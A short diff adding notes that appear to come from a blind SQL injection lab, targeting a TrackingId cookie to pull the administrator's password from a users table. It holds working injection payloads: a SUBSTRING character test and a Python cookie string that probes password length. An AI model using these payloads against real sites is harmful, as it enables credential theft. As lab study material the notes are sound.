@@ -1,0 +1,19 @@
+supposed query :
+    SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+        if it returns a row, then the user is tracked => Welcome Back
+Data :
+    table name : users 
+    columns : 
+        username
+        password
+goal :
+    get the password of the administator
+
+
+anlysis :
+    selecting the password of the administator from the users table
+        SUBSTRING(SELECT password FROM users WHERE username = 'administator')=char
+    TrackingId=q0T1Ib7XmJGENfpv' and SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) = 'a' --     
+
+#Getting the length of the password
+        cookies = {'TrackingId': f"q0T1Ib7XmJGENfpv' and ((SELECT username FROM users WHERE username='administrator' and LENGTH(password) = {current_length})='administrator') --"}
